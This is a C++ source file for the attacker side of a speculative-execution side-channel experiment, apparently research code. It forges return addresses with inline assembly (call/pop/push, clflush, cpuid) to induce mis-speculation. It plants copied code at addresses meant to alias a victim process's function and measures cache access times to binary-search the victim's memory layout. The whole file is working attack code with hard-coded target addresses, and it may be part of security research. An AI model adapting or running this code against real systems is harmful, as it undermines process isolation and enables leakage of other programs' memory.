#include "util.hpp"
#include <iostream>
#include <fstream>
#define magicNumber 123*256
#define maxCopyLength 128
#define iterations 10000

using namespace std;

char array[256*256];
void *loadMemoryPtr;

#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $13,%0;" "push %0;" "clflush (%%rsp);" "cpuid;" "ret;"

inline void timeAndFlush(ADDR_PTR addr) {
	printAccessTime(addr);
	clflush((void *)addr);
}

int checkForMisspeculation() {
	ADDR_PTR tmp;
	int total = 0;

	for (int i = 0; i < iterations; i++) {
		sched_yield();
		asm(
			retAsm( 1)
			retAsm( 2)
			retAsm( 3)
			retAsm( 4)
			retAsm( 5)
			retAsm( 6)
			retAsm( 7)
			retAsm( 8)
			retAsm( 9)
			retAsm(10)
			retAsm(11)
			retAsm(12)
			retAsm(13)
			retAsm(14)
			retAsm(15)
			retAsm(16)
			: "=r" (tmp)
			: 
		);
	
		total += measure_one_block_access_time((ADDR_PTR)&array[magicNumber]);
		clflush((void *)&array[magicNumber]);
	}

	// printf("%f\n", total/10000.0);
	return total/iterations;
}

void loadMemory() { // this should be at the same VA as victim's callLoop()
	// at least 6 nops!
	asm(
		".rept 115;"
		"nop;"
		".endr;"
		"mov $0x55555575db40, %%rax;"
		"mov (%%rax),%%rax;"
		: : : "rax"
	);
}

// void tmp() { // this should be at the same VA as victim's callLoop()
// 	volatile int temp = array[magicNumber];
// }

int doSearch(ADDR_PTR low, ADDR_PTR high) {
	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;
	printf("checking %p to %p. diff if is %lu\n", (void *)low, (void *)high, difference);
	fflush(stdout);

	int copyLength = maxCopyLength;
	while (copyLength > difference) {
		copyLength /= 2;
	}

	printf("copy length is %i\n", copyLength);

	for (ADDR_PTR i = low; i < high; i += copyLength) {
		printf("i: %p\n", (void *)i);
		printf("btw %p to %p\n", (void *)low, (void *)high);
		memcpy((void*)i, (void *)((ADDR_PTR)loadMemoryPtr+maxCopyLength-copyLength), copyLength);
		// memcpy((void*)i, loadMemoryPtr, maxCopyLength);
	}

	int result = checkForMisspeculation();
	printf("time is %i\n", result);
	memset((void *)low, 0, difference);

	return result;
}

ADDR_PTR search(ADDR_PTR low, ADDR_PTR high) {
	ADDR_PTR midpoint = (low + high) / 2;
	// printf("midpoint is %p\n", (void*)midpoint);
	size_t difference = (ADDR_PTR)high - (ADDR_PTR)low;

	if (difference <= 16) {
		return doSearch(low, high);
	}

	// printf("low is %p, diff is %lu\n", (void*)low, difference);

	int timeLow, timeHigh, timeDiff = 0;
	printf("starting diff %lu\n", high - low);
	while(timeDiff < 50) {
		timeLow = doSearch(low, midpoint);
		timeHigh = doSearch(midpoint, high);
		timeDiff = abs(timeLow - timeHigh);
		// printf("timediff is %i\n", timeDiff);
	}
	// return low;


	if (timeLow < timeHigh) {
		return search(low, midpoint);
	} else {
		return search(midpoint, high);
	}
}

void lastFunction();

int main(int argc, char *argv[]){
	if (argc > 1) {
		printf("doing nothing\n");
		while(1) {}
	}

	// startAddr = 0x0000555555565004;

	// addr = (ADDR_PTR)&array[magicNumber];

	// size_t tmp = 1<<20;

	void *requestedAddr = (void *)(ADDR_PTR(&lastFunction) + (1<<12));

	printf("requesting memory at %p\n", requestedAddr);
	void *startAddr = largeMap(requestedAddr);
	printf("starting address is %p\n", startAddr);
	void *endAddr = (void *)((ADDR_PTR)startAddr + (largeMapSize));
	printf("ending address is %p\n", endAddr);

	if (((ADDR_PTR)startAddr - (ADDR_PTR)requestedAddr) > 10000) {
		printf("not given requested address!\n");
		return 1;
	}

	loadMemoryPtr = (void *)((ADDR_PTR)&loadMemory+4);

	// memset((void*)0x555555556000, 'a', 1);
	// return 0;

	// search(ADDR_PTR(startAddr), ADDR_PTR(endAddr));
	doSearch(0x0000555555566000, 0x0000555555566040);

	// memcpy((void *)0x0000555555566000, loadMemoryPtr, maxCopyLength);

	// checkForMisspeculation();
	// // unmap(startAddr);

	// // void *ptr = copyFunction((ADDR_PTR)&lastFunction, (void *)((ADDR_PTR)&loadMemory+250));
	// checkForMisspeculation();

	return 0;
}

void lastFunction() {
	// End of code segment. Since Attacker doesn't use ASLR, this is close to 0.
	// Fill lots of memory after this point.
}